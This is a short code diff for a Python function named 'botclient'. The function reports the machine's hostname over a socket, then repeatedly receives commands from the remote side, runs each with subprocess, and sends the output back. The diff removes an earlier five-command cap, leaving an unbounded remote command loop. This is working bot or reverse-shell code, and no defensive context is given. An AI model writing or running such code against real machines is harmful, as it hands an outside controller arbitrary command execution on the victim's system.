@@ -11,22 +11,17 @@ def botclient():
 
     message = 'Connection from '+socket.gethostname()
     s.send(message.encode())
-    data = ''
-    count=0
-    while data != 'end' and count<5:
+    data = s.recv(1024).decode()
+    while data != 'end':
+        data = data.split(' ')
+        if (data):
+            try:
+                message = subprocess.run(data, stdout=subprocess.PIPE)
+                s.send(message.stdout)
+            except Exception as e:
+                print(e)
+                print('Error processing'.format(data))
         data = s.recv(1024).decode()
-        count=count+1
-        print('at exec')
-        print(data)
-        data=data.replace('\n','')
-        data=data.split(' ')
-        print(data)
-        try:
-        	message=subprocess.run(data,stdout=subprocess.PIPE)
-        	s.send(message.stdout)
-        except Exception as e:
-        	print(e)
-        	print('Error processing'.format(data))
     s.close()
 
 
